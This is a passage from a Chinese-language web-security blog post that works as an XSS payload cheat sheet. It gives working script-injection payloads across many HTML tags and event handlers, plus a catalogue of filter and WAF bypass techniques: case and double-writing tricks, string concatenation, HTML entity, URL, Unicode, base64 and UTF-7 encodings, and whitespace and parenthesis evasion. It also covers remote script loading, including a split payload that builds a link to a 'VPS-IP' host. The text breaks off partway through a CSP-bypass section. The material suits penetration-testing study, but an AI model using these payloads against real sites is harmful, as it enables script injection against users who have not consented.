class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br>&lt;iframe&gt; 是 HTML 中的一个元素，用于在当前页面内嵌入另一个 HTML 页面。onload 事件属性指定了当 &lt;iframe&gt; 完成加载过程时应该执行的 JavaScript 代码。<br></code></pre></td></tr></table></figure><p><strong><video></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;<br>跟image差不多，该标签用于嵌入视频内容，没有加载视频时就执行onerror<br></code></pre></td></tr></table></figure><p><strong><audio></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;<br>这个标签用于嵌入音频内容<br></code></pre></td></tr></table></figure><p><strong><body></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body/onload=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body<br>onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;<br>//onscroll 是一个内联事件处理器，它在用户滚动页面时触发，这里就是利用多个换行符自动追焦到输入框造成滚动效果<br></code></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><p><strong><textarea></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;<br></code></pre></td></tr></table></figure><p><strong><keygen></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐<br></code></pre></td></tr></table></figure><p><strong><marquee></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure><p><strong><isindex></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE<br></code></pre></td></tr></table></figure><h1 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h1><p>该标签在无CSP的情况下可以远程包含js文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;<br></code></pre></td></tr></table></figure><h1 id="XSS-Bypass"><a href="#XSS-Bypass" class="headerlink" title="XSS Bypass"></a>XSS Bypass</h1><h2 id="利用html属性绕过"><a href="#利用html属性绕过" class="headerlink" title="利用html属性绕过"></a>利用html属性绕过</h2><p>可以使用一些不同的属性去尝试一下：</p><ol><li><code>href</code>：用于定义超链接的目的地，攻击者可能会在其中嵌入JavaScript代码。<ul><li>例如：<code>&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click me&lt;/a&gt;</code></li></ul></li><li><code>src</code>：通常用于<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>等标签，指定外部资源的路径，可能会被用来加载并执行恶意脚本。<ul><li>例如：<code>&lt;script src=&quot;http://malicious.com/xss.js&quot;&gt;&lt;/script&gt;</code></li></ul></li><li><code>onclick</code>、<code>onerror</code>、<code>onmouseover</code>、<code>onmouseout</code>、<code>onload</code>：这些事件属性可以触发JavaScript代码的执行。<ul><li>例如：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot; /&gt;</code></li></ul></li><li><code>style</code>：可以包含CSS样式，但也可能通过CSS表达式来执行JavaScript。<ul><li>例如：<code>&lt;div style=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</code></li></ul></li><li><code>value</code>：表单元素的值，如果处理不当，也可能成为XSS攻击的途径。<ul><li>例如：<code>&lt;input type=&quot;text&quot; value=&quot;</code>alert('XSS')<code>&quot; onfocus=&quot;eval(this.value)&quot;&gt;</code></li></ul></li><li><code>data</code>：某些现代浏览器支持<code>data:</code>协议，允许在HTML中直接嵌入数据，这也可能被滥用。<ul><li>例如：<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgp&quot;&gt;&lt;/object&gt;</code></li></ul></li><li><code>background</code>：与<code>&lt;img&gt;</code>标签的<code>src</code>类似，<code>&lt;body&gt;</code>标签的<code>background</code>属性也可能被用于XSS攻击。</li><li><code>action</code>：在<code>&lt;form&gt;</code>标签中定义表单提交的URL，如果允许用户输入，可能会被用来执行XSS攻击。</li><li><code>dynsrc</code>：与<code>&lt;embed&gt;</code>和<code>&lt;object&gt;</code>标签相关，用于指定动态加载的媒体资源，也可能被用于加载恶意脚本。</li></ol><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxxxx?q=&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;<br></code></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>有些waf会将关键字替换为空，这时候就可以双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><p>拼接绕过的思路就是利用一些关键字能够拿到函数名或者利用eval能够将字符串当作js代码执行。</p><p><strong>eval</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>top</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>top</code> 是一个关键字，通常用于引用浏览器窗口的顶层框架（frame）。</p><p><code>top</code> 是用来确保这段代码能在当前页面的顶层窗口执行，而不是在某个嵌套的框架或iframe中执行。这样做可以确保攻击者能够突破框架的安全限制，直接对顶层浏览器窗口进行操作。</p><p><strong>window</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>window</code> 对象代表当前浏览器窗口的一个实例。它是全局对象，意味着在浏览器的全局作用域内定义的任何变量或函数都隐式地作为<code>window</code>对象的属性。</p><p>通过使用方括号表示法 <code>window[&#39;al&#39;+&#39;ert&#39;]</code>，代码在运行时动态地构建了字符串<code>&#39;alert&#39;</code>，然后作为属性名去访问<code>window</code>对象上的<code>alert</code>函数。</p><p><strong>self</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>self</code> 是一个全局对象，它引用当前的执行环境，即全局上下文。在普通的浏览器环境中，<code>self</code> 通常与 <code>window</code> 对象是等价的，因为浏览器中的全局上下文就是 <code>window</code> 对象。</p><p><strong>parent</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>parent</code> 关键字被用于引用当前文档的父级窗口或框架。在HTML页面中，如果存在iframe或frame，每个框架都有自己的 <code>window</code> 对象，而 <code>parent</code> 对象提供了一种方式来引用这些不同层级的对象。</p><p><code>parent</code> 对象是一个特殊的全局对象，它指向含有当前执行代码的窗口或框架的直接父级。如果当前执行代码的窗口是顶层窗口，那么 <code>parent</code> 和 <code>window</code> 是相同的。如果代码运行在一个框架中，<code>parent</code> 将指向包含该框架的窗口。</p><p><strong>frames</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;<br></code></pre></td></tr></table></figure><p><code>frames</code> 关键字被用于引用浏览器窗口中的所有框架（frames）和iframe元素。在HTML中，<code>&lt;frameset&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素可以被用来创建框架，这些框架可以包含其他网页，每个网页都有其独立的文档和窗口对象。</p><h2 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;<br></code></pre></td></tr></table></figure><p>这些函数在其他标签也可以使用</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>也就是利用各种实体编码或者实体名称绕过</p><p>html实体编码也就是转义一些在html中有特殊意义的字符，比如<、>之类的</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>十进制实体编码</th><th>十六进制实体编码</th></tr></thead><tbody><tr><td></td><td>空格</td><td>&amp;nbsp;</td><td>&amp;#160;</td><td>&amp;#x20;</td></tr><tr><td><</td><td>小于号</td><td>&amp;lt;</td><td>&amp;#60;</td><td>&amp;#x3c;</td></tr><tr><td>></td><td>大于号</td><td>&amp;gt;</td><td>&amp;#62;</td><td>&amp;#x3e;</td></tr><tr><td>"</td><td>双引号</td><td>&amp;quot;</td><td>&amp;#34;</td><td>&amp;#x22;</td></tr><tr><td>+</td><td>加号</td><td>&amp;plus;</td><td>&amp;#43;</td><td>&amp;#x2B;</td></tr></tbody></table><blockquote><p> HTML 中的常用字符实体是不间断空格。</p><p>（注意：实体名称对大小写敏感！） </p><p>字符实体类似这样：&entity_name; 或者 &#entity_number;</p></blockquote><p>比如可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;aaa&lt;/a&gt;<br>//下面是不带分号的写法<br>&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;<br>//还可以填充0<br>&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>这个出来就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>相关的实体编码可以在这个网站查找：<a href="https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061">https://symbl.cc/cn/unicode/blocks/basic-latin/#subblock-0061</a></p><p><strong>还可以url编码</strong></p><p>当注入点存在href或者src时可以使用url编码，但是编码时不能对协议类型进行任何操作</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;<br>//url编码<br>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;<br>//可以二次编码<br>&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;<br>&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p><strong>js编码</strong></p><p>js编码解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</p><p>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</p><p>js编码策略：</p><ol><li>"&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\074"</li><li>"\x" 加上两个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\x3c"</li><li>"\u" 加上四个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\u003c"</li><li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; <br><br>//Unicode编码<br>&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; <br></code></pre></td></tr></table></figure><blockquote><p>Unicode编码时只能对有效的标识进行编码，否则非标识符被解码后是不能执行的，比如：alert(1)只能对alert和1进行编码，括号编码后会失去作用，不能执行</p><p>如果用eval、setTimeout等函数传递变量时就可以对整个传递参数进行编码，例如：<strong>例如 eval("alert(1)")，可以对 "alert(1)" 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。</strong></p></blockquote><p>所以浏览器的解析过程是：html解析 —— url解析 —— js解析</p><p>我们还可以用一些混合编码和组合编码进行绕过，具体参考：<a href="https://www.freebuf.com/articles/web/340080.html">xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户</a></p><p><strong>base64编码</strong></p><p>我们还可以利用data伪协议进行base64编码绕过</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//编码的内容为：&lt;script&gt;alert(/xss/)&lt;/script&gt;<br>1.&lt;object&gt; 标签<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;<br>2.&lt;a&gt; 标签<br>&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）<br>3.&lt;iframe&gt; 标签<br>&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;<br>4.&lt;embed&gt; 标签<br>&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;<br></code></pre></td></tr></table></figure><p><strong>编码解码函数</strong></p><p>atob()函数用于base64解码</p><p>btoa()函数用于base64编码</p><p><strong>其他字符集编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//UTF-7，&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;<br>+ADw-script+AD4-alert(&#x27;XSS&#x27;)+ADsAPA-/script+AD4-<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445441.png" alt="image-20240430092823778"></p><p><strong>UTF-16</strong>： UTF-16使用2个或4个字节来表示Unicode字符。攻击者可能会尝试将JavaScript代码编码为UTF-16字节顺序标记（BOM），并将其插入到输入字段中。一些系统可能会错误地将这些字节解释为UTF-16文本，而不是JavaScript代码。</p><p>例如，<code>\u2028</code>（UTF-16的行分隔符）和<code>\u2029</code>（UTF-16的段落分隔符）有时可以用来绕过基于行的输入过滤器。</p><h2 id="js伪协议"><a href="#js伪协议" class="headerlink" title="js伪协议"></a>js伪协议</h2><p> 伪协议的形式就是：<strong>javascript:alert(/xss/)</strong></p><p>在插入js代码的地方都可以尝试一下伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7以下<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br>&lt;body background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;<br></code></pre></td></tr></table></figure><ul><li>A位置可填充 /，/123/，%09，%0A，%0C，%0D，%20</li><li>B位置可填充 %09，%0A，%0C，%0D，%20</li><li>C位置可填充 %0B，/**/，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20</li><li>D位置可填充 %09，%0A，%0C，%0D，%20，//，></li></ul><h2 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h2><p><strong>反引号替换</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert`1`&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>throw绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;<br>&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h2><p><strong>斜杠替换</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>反引号替换</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(`xss`)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="地址过滤"><a href="#地址过滤" class="headerlink" title="地址过滤"></a>地址过滤</h2><p><strong>http被过滤</strong></p><p>可以用<code>//</code>代替<code>http://</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;<br></code></pre></td></tr></table></figure><p>可以使用<code>\\</code>，不过这在Linux下才能代替http://，在Windows下相当于file协议</p><p><strong>逗号过滤</strong></p><p>可以用中文逗号代替英文逗号，中文逗号会被自动转成英文逗号；中文的句号也可以代替点。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度<br></code></pre></td></tr></table></figure><h2 id="alert过滤"><a href="#alert过滤" class="headerlink" title="alert过滤"></a>alert过滤</h2><p>可以利用其他的函数来替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>可以利用拆分的方法，利用eval函数和变量赋值的方法进行拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;<br>&lt;script&gt;eval(a)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>还可以利用加载外部js文件</strong></p><ul><li><p><code>$.getScript</code>：<code>$.getScript</code> 是 jQuery 库提供的一个函数，它允许你异步地从服务器加载 JavaScript 文件。这个函数非常适合用于在页面加载之后按需加载脚本，从而可以改善网页的响应速度和性能。</p><p>假设你有一个 JavaScript 文件 <code>example.js</code>，里面包含了一些页面加载后需要执行的代码，可以这样使用：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">getScript</span>(<span class="hljs-string">&quot;example.js&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Script loaded and executed successfully!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><code>$.get</code></p><p><code>$.get</code> 是 jQuery 库中的一个函数，用于执行 HTTP GET 请求。它可以用来从服务器异步地加载数据，并且通常用于请求 JSON、HTML、XML 或脚本文件。</p><p>基本语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$.get(url, data, successCallback, dataType)<br><br>url：要请求的资源的 URL。<br>data：（可选）一个键值对的映射，表示要发送的查询字符串参数。<br>successCallback：（可选）一个回调函数，当请求成功时执行。它接受一个参数，通常是响应的数据。<br>dataType：（可选）预期的服务器响应的数据类型。例如：&quot;json&quot;, &quot;html&quot;, &quot;text&quot;, &quot;xml&quot; 等。<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;example.com/data&quot;</span>, &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-comment">// 处理加载的数据</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;, <span class="hljs-string">&quot;json&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><h2 id="过滤分号"><a href="#过滤分号" class="headerlink" title="过滤分号"></a>过滤分号</h2><p>可以使用花括号进行语句的分隔</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h2><h3 id="CSP介绍"><a href="#CSP介绍" class="headerlink" title="CSP介绍"></a>CSP介绍</h3><p>这里先了解一下什么是CSP：</p><p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p><p><strong>配置</strong></p><p>CSP策略可以通过 HTTP 头信息或者 meta 元素定义。</p><p>CSP 有三类：</p><ul><li>Content-Security-Policy (Google Chrome)</li><li>X-Content-Security-Policy (Firefox)</li><li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTTP header :<br>&quot;Content-Security-Policy:&quot; 策略<br>&quot;Content-Security-Policy-Report-Only:&quot; 策略<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTML Meta :<br>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;<br>&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>主要指令</strong></p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 <audio>、<video> 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 <applet>、<embed>、<object> 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>base-uri</td><td>定义 <base> 根URL策略，不使用default-src作为默认值</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><p><strong>关键字</strong></p><ul><li><p><code>-</code></p><p>允许从任意url加载，除了 <code>data:</code> <code>blob:</code> <code>filesystem:</code> <code>schemes</code></p><p>e.g. <code>img-src -</code></p></li><li><p><code>none</code></p><p>禁止从任何url加载资源</p><p>e.g. <code>object-src &#39;none&#39;</code></p></li><li><p><code>self</code></p><p>只可以加载同源资源</p><p>e.g. <code>img-src &#39;self&#39;</code></p></li><li><p><code>data:</code></p><p>可以通过data协议加载资源</p><p>e.g. <code>img-src &#39;self&#39; data:</code></p></li><li><p><code>blob:</code>:</p><p>表示允许加载blob URL格式的资源。</p><p>e.g. <code>img-src &#39;self&#39; blob:</code></p></li><li><p><code>domain.example.com</code></p><p>e.g. <code>img-src domain.example.com</code>只可以从特定的域加载资源</p></li><li><p><code>\*.example.com</code></p><p>e.g. <code>img-src \*.example.com</code>可以从任意example.com的子域处加载资源</p></li><li><p><code>https://cdn.com</code></p><p>e.g. <code>img-src https://cdn.com</code>只能从给定的域用https加载资源</p></li><li><p><code>https:</code></p><p>e.g. <code>img-src https:</code>只能从任意域用https加载资源</p></li><li><p><code>unsafe-inline</code></p><p>允许内部资源执行代码例如style attribute,onclick或者是sicript标签</p><p>e.g. <code>script-src &#39;unsafe-inline&#39;</code></p></li><li><p><code>unsafe-eval</code></p><p>允许一些不安全的代码执行方式，例如js的eval()</p><p>e.g. <code>script-src 